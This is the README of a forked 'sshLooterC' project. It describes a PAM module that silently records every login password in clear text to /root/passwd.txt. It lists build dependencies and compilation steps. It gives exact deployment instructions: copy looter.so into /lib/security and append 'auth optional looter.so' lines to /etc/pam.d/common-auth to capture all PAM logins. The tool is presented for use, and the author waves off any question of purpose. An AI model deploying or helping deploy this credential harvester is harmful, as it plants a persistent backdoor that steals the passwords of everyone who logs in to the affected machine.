# SSHLooter C version with local save

It's a slightly edited version of [sshLooterC](https://github.com/mthbernardes/sshLooterC), which save the passwords in clear text in a local file.  
In this version, curl dependencies have been deleted.

What? "Why should I want to save locally the credentials?", you say?
I don't know and I don't care!

## Getting Started

These instructions will get you a copy of the project up and running on your local machine for development and testing purposes. See deployment for notes on how to deploy the project on a live system.

### Prerequisites

You need to meet the following dependencies:

* gcc
* libpam0g-dev

### Configure

Edit the `looter.c` to select where to store passwords.  
As is, the passwords will be stored in `/root/passwd.txt`.  
If the path is not a concern you can just skip to compiling.

### Compiling

```bash
make
```

## Deployment

Copy the `looter.so` to the wanted machine on `/lib/security`, then edit the `/etc/pam.d/common-auth` and append the following lines:
```
auth optional looter.so
account optional looter.so
```

From now on, all the (PAM) logins will be stored.

## Authors

* **Gregorio Casa** - *Few mods* - [ingroxd](https://github.com/ingroxd)
* **Matheus Bernardes** - *Initial work* - [mthbernardes](https://github.com/mthbernardes)

See also the list of [contributors](https://github.com/ingroxd/sshLooterC/contributors) who participated in this project.

## Acknowledgments

* Thanks to [mthbernardes](https://github.com/mthbernardes) for the original project;
* Thanks to [slim8shady9](https://github.com/slim8shady9) for insipration :D.

